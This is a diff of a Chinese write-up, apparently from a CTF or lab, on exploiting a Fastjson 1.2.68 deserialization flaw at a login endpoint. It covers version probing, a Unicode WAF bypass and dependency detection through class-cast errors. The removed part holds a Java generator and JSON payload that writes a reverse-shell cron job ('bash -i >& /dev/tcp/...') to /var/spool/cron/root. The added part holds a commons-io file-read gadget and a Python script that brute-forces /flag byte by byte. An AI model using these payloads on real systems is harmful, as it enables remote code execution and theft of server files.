@@ -1,138 +1,147 @@
-在登录处抓包，发现为json格式传入参数：
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693192153552-521f193f-9d9a-4db4-ba41-660711b12100.png#averageHue=%23fbfbfb&clientId=u86b445f7-787a-4&from=paste&height=124&id=u83cd0353&originHeight=155&originWidth=572&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=10325&status=done&style=none&taskId=u4204412d-4bff-4584-95b9-cbfee3948d4&title=&width=457.6)
-删个末尾的}(也可以加个"),看报错，很标准的fastjson错误提示，确定后端使用的fastjson
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693193197646-62ce7b5b-6bd1-4a24-945f-29c92db88de9.png#averageHue=%23fbfbfb&clientId=u86b445f7-787a-4&from=paste&height=199&id=ucbb98b32&originHeight=249&originWidth=1208&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=41602&status=done&style=none&taskId=ud6dd13f4-31a4-40c8-90d4-bf6eeaa2d07&title=&width=966.4)
-dnslog测试是否存在漏洞：
-```json
-{
-  "@type":"java.net.Inet4Address",
-  "val":"zqs9do.dnslog.cn"
-}
-```
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693202239832-b2ab63d5-53b6-4c65-80a7-2f2ca0a24c94.png#averageHue=%23fcfbfb&clientId=uc6d7ad91-e62c-4&from=paste&height=149&id=u6413586c&originHeight=186&originWidth=1082&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=29277&status=done&style=none&taskId=u6752c7a0-3e14-4fba-a22e-1ae9af02020&title=&width=865.6)
-有waf,依然使用unicode编码绕过
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693202702343-27f86e61-6961-4751-a484-16f60521e166.png#averageHue=%23f9f8f8&clientId=uc6d7ad91-e62c-4&from=paste&height=268&id=u38bd37b4&originHeight=335&originWidth=1102&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=69379&status=done&style=none&taskId=u143fecbd-ed44-4306-9318-ddec51ac432&title=&width=881.6)
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1696399593289-13b421da-5502-482f-b20c-17b1fe3e7714.png#averageHue=%23a09379&clientId=u4d4c1774-f025-4&from=paste&height=215&id=u98f9c855&originHeight=269&originWidth=1195&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=57987&status=done&style=none&taskId=u95161c4f-748f-41eb-bb45-316de5cabc1&title=&width=956)
+这里判断方式与之前方式一致，就不写了。
 探测fastjson精确版本：
 ```json
 {
-  "\u0040\u0074\u0079\u0070\u0065": "java.lang.AutoCloseable"
+  "@type": "java.lang.AutoCloseable"
 ```
-通过报错，发现版本为1.2.68，在这个大版本下极大的限制 了jndi的利用，因此比较常见的利用方式为文件读写。文件写操作能够造成的危害同样很大，比如写入计划任务、写入ssh密钥、class文件类加载或jar包等。
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693205802217-aa62bbca-ba3c-4b88-a439-8f1688cf45e1.png#averageHue=%23fdfdfd&clientId=u6ef5e71e-f1f2-4&from=paste&height=198&id=u52b5559a&originHeight=247&originWidth=1249&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=35374&status=done&style=none&taskId=uf8e77f86-fdfd-4b58-a9b1-b55fabbd897&title=&width=999.2)
+通过报错，发现版本为1.2.68，在这个大版本下极大的限制 了jndi的利用，因此比较常见的利用方式为文件读写。
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693214944518-597de48b-c916-422d-a386-5e4e04dcca7d.png#averageHue=%23fdfdfd&clientId=u2b2ca306-6134-4&from=paste&height=142&id=uc7c3ffaf&originHeight=178&originWidth=1254&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26918&status=done&style=none&taskId=ue16f780d-d980-4e60-b79c-c59beb2ddd1&title=&width=1003.2)
 环境依赖探测：
-在1.2.68中文件写操作不只是单纯依靠fastjson，还需利用其他依赖，比较常见的是commons-io等。但是还有一种情况是在JDK11下，是不需要引入其他依赖即可造成文件写入。所以可优先探测该机器所使用的Java版本是否为JDK11。(依赖类探测主要为了解决Fastjson高版本下需依赖其他环境组合攻击，可结合我们已知Poc针对性的探测！)
-利用charactor类型转换报错，当存在指定的类时会报转换错误，不存在则无显示，具体参考首页FastJson全版本利用Poc那篇文章。
-`java.net.http.HttpClient`本身是JDK11下才特有的类，用于探测环境是否为JDK11
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693207937357-27f5f756-eb23-40f7-9098-c972b0016824.png#averageHue=%23fefefe&clientId=u6ef5e71e-f1f2-4&from=paste&height=176&id=u72739f57&originHeight=220&originWidth=1236&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36417&status=done&style=none&taskId=ue2d68d6c-82ca-4c89-be87-b08962da9c6&title=&width=988.8)
-`can not cast to char`代表存在该类，即环境为JDK11，比如这样
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1696400166956-b3a7ed0b-c203-44ba-b378-8458592425d1.png#averageHue=%23fefefd&clientId=u4d4c1774-f025-4&from=paste&height=213&id=u5377bf72&originHeight=266&originWidth=1416&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=40418&status=done&style=none&taskId=ub457f7f9-8eb7-46d6-933b-b3e99c2769f&title=&width=1132.8)
-`org.springframework.web.bind.annotation.RequestMapping`是SpringBoot特有的类，所以该环境为SpringBoot。
-如果类不存在则无回显：
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693208011055-a900abde-82fe-4c3c-b454-86679d3f7e4c.png#averageHue=%23fdfdfd&clientId=u6ef5e71e-f1f2-4&from=paste&height=171&id=u2e004965&originHeight=214&originWidth=1133&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=34305&status=done&style=none&taskId=u5b19627c-faea-4b9e-82d5-0cb692d9f73&title=&width=906.4)
-确定了使用的JDK11，便可无限制写入文件。这里采用写入计划任务反弹shell。
-JDK11-Writefile.java:
-```java
-public static void main(String[] args) throws Exception {
-    	String code = gzcompress("* * * * *  bash -i >& /dev/tcp/10.30.0.84/9999 0>&1 \n");
-    	//<=1.2.68 and JDK11
-        String payload = "{\r\n"
-        		+ "    \"@type\":\"java.lang.AutoCloseable\",\r\n"
-        		+ "    \"@type\":\"sun.rmi.server.MarshalOutputStream\",\r\n"
-        		+ "    \"out\":\r\n"
-        		+ "    {\r\n"
-        		+ "        \"@type\":\"java.util.zip.InflaterOutputStream\",\r\n"
-        		+ "        \"out\":\r\n"
-        		+ "        {\r\n"
-        		+ "           \"@type\":\"java.io.FileOutputStream\",\r\n"
-        		+ "           \"file\":\"/var/spool/cron/root\",\r\n"
-        		+ "           \"append\":false\r\n"
-        		+ "        },\r\n"
-        		+ "        \"infl\":\r\n"
-        		+ "        {\r\n"
-        		+ "            \"input\":\r\n"
-        		+ "            {\r\n"
-        		+ "                \"array\":\""+code+"\",\r\n"
-        		+ "                \"limit\":1999\r\n"
-        		+ "            }\r\n"
-        		+ "        },\r\n"
-        		+ "        \"bufLen\":1048576\r\n"
-        		+ "    },\r\n"
-        		+ "    \"protocolVersion\":1\r\n"
-        		+ "}\r\n"
-        		+ "";
-        
-        System.out.println(payload);
-        JSON.parseObject(payload);
-    }
-    public static String gzcompress(String code) {
-    	byte[] data = code.getBytes();
-        byte[] output = new byte[0];
-        Deflater compresser = new Deflater();
-        compresser.reset();
-        compresser.setInput(data);
-        compresser.finish();
-        ByteArrayOutputStream bos = new ByteArrayOutputStream(data.length);
-        try {
-            byte[] buf = new byte[1024];
-            while (!compresser.finished()) {
-                int i = compresser.deflate(buf);
-                bos.write(buf, 0, i);
-            }
-            output = bos.toByteArray();
-        } catch (Exception e) {
-            output = data;
-            e.printStackTrace();
-        } finally {
-            try {
-                bos.close();
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-        }
-        compresser.end();
-        System.out.println(Arrays.toString(output));
-        return Base64.getEncoder().encodeToString(output);
-    }
-```
-运行即可生成exp
-在写入计划任务时，有几个需要注意的点：
-
-- linux本身系统限制，首先centos和ubuntu系列是不同的，写入文件位置、命令方式均有区别，这里因为是centos系统，所以写入到`/var/spool/cron/root`文件下，而ubuntu系统则应该写入到`/etc/crontab`系统级计划任务下，而不是`/var/spool/cron/crontabs/root`文件下，因为该方式将会涉及到改权限、计划任务服务重启的操作。
-- 通过这种文件写入漏洞写入计划任务时，需要在命令的后面加上换行操作，保证该命令为完整的一行，否则不会反弹成功。
-
-写入反弹shell计划任务到`/var/spool/cron/root`中，将会生成Json格式的payload
+利用charactor类型转换报错，当存在指定的类时会报转换错误，不存在则无显示
+先探测是否为JDK11
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693215147683-7e0f9aa8-6c2b-49d3-9bf9-22f1e1cedbde.png#averageHue=%23fcfcfc&clientId=u2b2ca306-6134-4&from=paste&height=156&id=u57f2da7b&originHeight=195&originWidth=1110&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=31800&status=done&style=none&taskId=u497bd5af-4261-4c1b-bf3e-943a2a24953&title=&width=888)
+很明显不是，那么探测是否存在依赖：commons-io
 ```json
-
 {
-    "\u0040\u0074\u0079\u0070\u0065":"java.lang.AutoCloseable",
-    "\u0040\u0074\u0079\u0070\u0065":"sun.rmi.server.MarshalOutputStream",
-    "out":
-    {
-        "\u0040\u0074\u0079\u0070\u0065":"java.util.zip.InflaterOutputStream",
-        "out":
-        {
-           "\u0040\u0074\u0079\u0070\u0065":"java.io.FileOutputStream",
-           "file":"/var/spool/cron/root",
-           "append":false
-        },
-        "infl":
-        {
-            "input":
-            {
-                "array":"eJzTUtCCQoWkxOIMBd1MBTs1Bf2U1DL9kuQCfUMDPWMDPQM9CxN9SyBQMLBTM1TgAgBAXQuq",
-                "limit":1999
-            }
-        },
-        "bufLen":1048576
+  "x": {
+    "@type": "java.lang.Character"{
+  "@type": "java.lang.Class",
+  "val": "org.apache.commons.io.Charsets"
+}}
+```
+出现cast转换错误，存在commonss-io，但还无法分辨版本
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693216179131-35484970-7471-48ff-bfc3-a6615d55b080.png#averageHue=%23fefefe&clientId=u2b2ca306-6134-4&from=paste&height=159&id=ub59e0d30&originHeight=199&originWidth=1231&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30846&status=done&style=none&taskId=u29d267f4-1578-4e44-9bf4-bbb72662139&title=&width=984.8)
+```json
+{
+  "x": {
+    "@type": "java.lang.Character"{
+  "@type": "java.lang.Class",
+  "val": "org.apache.commons.io.file.Counters"
+}}
+```
+`org.apache.commons.io.file.Counters`是在commons-io2.7~2.8引入，无关键报错回显，说明不是2.7~2.8版本
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693216246064-60587330-c7c5-4e9e-9605-6e3f62fe9769.png#averageHue=%23fefefe&clientId=u2b2ca306-6134-4&from=paste&height=155&id=uaec34b6e&originHeight=194&originWidth=1056&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=27933&status=done&style=none&taskId=uf9943d1d-dd79-4087-9f2b-c073c23ad0d&title=&width=844.8)
+本身在commons-io2.0~2.8下是存在任意文件写入的，但是可能因为系统的原因复现并没有成功(可本地能够成功。。。),所以把思路转变为任意文件读取。
+Poc:
+```json
+{
+  "abc": {
+    "@type": "java.lang.AutoCloseable",
+    "@type": "org.apache.commons.io.input.BOMInputStream",
+    "delegate": {
+      "@type": "org.apache.commons.io.input.ReaderInputStream",
+      "reader": {
+        "@type": "jdk.nashorn.api.scripting.URLReader",
+        "url": "file:///etc/passwd"
+      },
+      "charsetName": "UTF-8",
+      "bufferSize": 1024
     },
-    "protocolVersion":1
+    "boms": [
+      {
+        "charsetName": "UTF-8",
+        "bytes": [
+          114,111,111,116
+        ]
+      }
+    ]
+  },
+  "address": {
+    "@type": "java.lang.AutoCloseable",
+    "@type": "org.apache.commons.io.input.CharSequenceReader",
+    "charSequence": {
+      "@type": "java.lang.String"{"$ref":"$.abc.BOM[0]"},
+    "start": 0,
+    "end": 0
+  }
+}
 }
 ```
-光这样还不行，因为后面一步需要在limit处写入文件内真实数据的长度，而这个长度会因为一些处理导致并不是我们写入计划任务命令的长度，这里方法同样是利用到报错，先将limit值尽量设置较大，fastjson会因为偏移位置不对爆出正确的数据偏移，即这里的54，所以54才是真实的数据长度。
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693210817825-e638cb42-0d1f-4f6f-9346-85bdd7cfd1b2.png#averageHue=%23fdfcfc&clientId=u6ef5e71e-f1f2-4&from=paste&height=171&id=u97e0a20c&originHeight=214&originWidth=1124&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=33085&status=done&style=none&taskId=ude4e6c63-fb19-4057-8ceb-311d61d463e&title=&width=899.2)
-这便是写入成功了。
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693211158791-fcde713b-7371-417c-b917-733febbba852.png#averageHue=%23fefefe&clientId=u6ef5e71e-f1f2-4&from=paste&height=171&id=u99d95ddc&originHeight=214&originWidth=1121&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=31210&status=done&style=none&taskId=ucde5e06d-402e-4ee5-8ddb-94e20fd17c6&title=&width=896.8)
-大概等待一分钟即可反弹shell：
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693211211936-14728b5c-971b-4bae-881a-8dd0464a79f4.png#averageHue=%23423c47&clientId=u6ef5e71e-f1f2-4&from=paste&height=202&id=ud8e754d2&originHeight=252&originWidth=929&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=563328&status=done&style=none&taskId=u5e59b430-8cad-4735-a5b2-4980bc2455c&title=&width=743.2)
+先测试读/etc/passwd，看看是否成功，因为/etc/passwd文件开头一定为root，对应ascii码的话就是：`114,111,111,116`,这种报错就是成功的，代表字节没问题。
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693217559283-cb73454c-d2c3-499c-8f0f-22c1fba72be0.png#averageHue=%23fdfdfd&clientId=u2b2ca306-6134-4&from=paste&height=230&id=u080e1a47&originHeight=288&originWidth=1211&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=42687&status=done&style=none&taskId=ue3f1a346-d525-48df-9a56-ce94249107b&title=&width=968.8)
+这种说明不对，字节错误
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693217664073-aba513aa-eca8-436c-852b-c4e06d8282ac.png#averageHue=%23fefefe&clientId=uf2a3ebb0-ea3b-4&from=paste&height=246&id=u77f81ea0&originHeight=307&originWidth=1074&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=41229&status=done&style=none&taskId=ud65cf226-a196-46dd-896d-7719c4eb213&title=&width=859.2)
+因此就导致了bool盲注产生。那么后面就是写脚本读取敏感文件，爆破字节即可。
+比如这里读目标flag文件
+exp.py: [exp.py](https://www.yuque.com/attachments/yuque/0/2023/py/26045928/1696407182990-4248cf78-7da3-4c33-8817-1e0dd933cb09.py?_lake_card=%7B%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2023%2Fpy%2F26045928%2F1696407182990-4248cf78-7da3-4c33-8817-1e0dd933cb09.py%22%2C%22name%22%3A%22exp.py%22%2C%22size%22%3A2035%2C%22ext%22%3A%22py%22%2C%22source%22%3A%22%22%2C%22status%22%3A%22done%22%2C%22download%22%3Atrue%2C%22taskId%22%3A%22u0fe64061-a0fb-4ea3-825d-29caaba9cc6%22%2C%22taskType%22%3A%22transfer%22%2C%22type%22%3A%22text%2Fx-python%22%2C%22mode%22%3A%22title%22%2C%22id%22%3A%22u76742bb2%22%2C%22card%22%3A%22file%22%7D)
+```python
+import requests
+import json
+
+url = "http://10.30.0.84/login"
+
+asciis = [10,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126]
+file_byte = []
+data1 = """
+{
+    "abc": {
+				"@type": "java.lang.AutoCloseable",
+        "@type": "org.apache.commons.io.input.BOMInputStream",
+        "delegate": {
+            "@type": "org.apache.commons.io.input.ReaderInputStream",
+            "reader": {
+                "@type": "jdk.nashorn.api.scripting.URLReader",
+                "url": "file:///flag"
+            },
+            "charsetName": "UTF-8",
+            "bufferSize": 1024
+        },
+        "boms": [
+            {
+                "charsetName": "UTF-8",
+                "bytes": [
+"""  
+
+data2 = """
+                ]
+            }
+        ]
+    },
+    "address": {
+        "@type": "java.lang.AutoCloseable",
+        "@type": "org.apache.commons.io.input.CharSequenceReader",
+        "charSequence": {
+            "@type": "java.lang.String"{"$ref":"$.abc.BOM[0]"},
+            "start": 0,
+            "end": 0
+        }
+    }
+}
+"""
+proxies = {
+    'http': '127.0.0.1:8080',
+}
+
+header = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
+    "Content-Type": "application/json; charset=utf-8"
+}
+
+
+for i in range(1,30):  # 需要读取多长自己定义，但一次性不要太长，建议分多次读取
+    for i in asciis:
+        file_byte.append(str(i))
+        req = requests.post(url=url,data=data1+','.join(file_byte)+data2,headers=header)
+        text = req.text
+        if "charSequence" not in text:
+            file_byte.pop()         
+
+print(','.join(file_byte))   
+file_str = ""
+for i in file_byte:
+    file_str += chr(int(i))
+print(file_str)
+```
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693217926650-e7de1ddf-e5db-49ed-a785-2ba790e4a3fd.png#averageHue=%231e1c1b&clientId=uf2a3ebb0-ea3b-4&from=paste&height=72&id=u629cd55d&originHeight=90&originWidth=923&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=9891&status=done&style=none&taskId=u05ae156b-43cb-4994-92bc-9c6d4a1a912&title=&width=738.4)
 
